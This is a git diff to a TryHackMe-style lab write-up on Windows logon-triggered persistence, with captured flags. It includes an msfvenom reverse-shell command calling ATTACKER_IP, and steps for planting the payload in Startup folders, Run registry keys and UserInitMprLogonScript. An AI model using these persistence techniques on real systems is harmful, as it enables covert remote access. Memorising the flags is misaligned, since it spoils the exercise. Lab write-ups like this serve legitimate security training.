@@ -98,17 +98,38 @@ Great:<br />
 
 ### Logon Triggered Persistence
 - Insert flag10 here<br />
-Each user has a folder under C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there.<br />
-- Insert flag11 here
-- Insert flag12 here
-- Insert flag13 here
-
+Each user has a folder under `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there. If we want to force all users to run a payload while logging in, we can use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`<br />
+Generate a .exe payload using msfvenom: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe`. <br />
+Transfer it to the target machine: <br />
+![image](https://github.com/user-attachments/assets/9e30d61a-ff45-4d6a-9558-b319292bb210)<br />
+Now log off the machine<br />
+![image](https://github.com/user-attachments/assets/ea9cc8d4-82bb-4d0b-ac2e-10d650e855f5)<br />
+and log back(you can reconnect from the splitview in THM, or you can use RDP):<br />
+![image](https://github.com/user-attachments/assets/1fa42aee-82fc-4586-bd43-fb3f9ed22a6d)<br />
+`THM{NO_NO_AFTER_YOU}`
+- Insert flag11 here<br />
+Move the revshell we used earlier in C:\Windows: `move revshell.exe C:\Windows`. Now use `PsExec64.exe -i -s regedit` to open the registry, edit it this way: <br />
+![image](https://github.com/user-attachments/assets/b443a68d-c738-49bc-b13a-6cd393bf3342)<br />
+Now sign out and reconnect again (HKLM\Software\Microsoft\Windows\CurrentVersion\Run is an executable that every user will run on log on)<br />
+![image](https://github.com/user-attachments/assets/be75f6a3-38b0-4701-b489-1c08ed2d5b43)<br />
+`THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}`
+- Insert flag12 here<br />
+Now use `C:\tools\pstools\PsExec64.exe -i -s regedit` to open the registry. <br />
+![image](https://github.com/user-attachments/assets/c8f6bd0a-1bfe-495e-a0aa-4f0469b7e667)<br />
+Open a listener, sign out and login again: <br />
+![image](https://github.com/user-attachments/assets/bdade126-b433-4e3c-9564-9c7027a54dbc)<br />
+`THM{I_INSIST_GO_FIRST}`
+- Insert flag13 here<br />
+Open the registry again, this time edit it by creating an "Expandable String value": <br />
+![image](https://github.com/user-attachments/assets/cba6ddbc-0b22-411a-bc17-e7aa0e4ca99d)<br />
+The string name is: `UserInitMprLogonScript`. <br />
+Now again open a nc lister, log out and log in again:<br />
+`THM{USER_TRIGGERED_PERSISTENCE_FTW}`
 ### Backdooring the Login Screen / RDP
-- Insert flag14 here
-- Insert flag15 here
+- Insert flag14 here<br />
+- Insert flag15 here<br />
 
 ### Persisting Through Existing Services
-- Insert flag16 here
-- Insert flag17 here
+- Insert flag16 here<br />
+- Insert flag17 here<br />
 
-### 
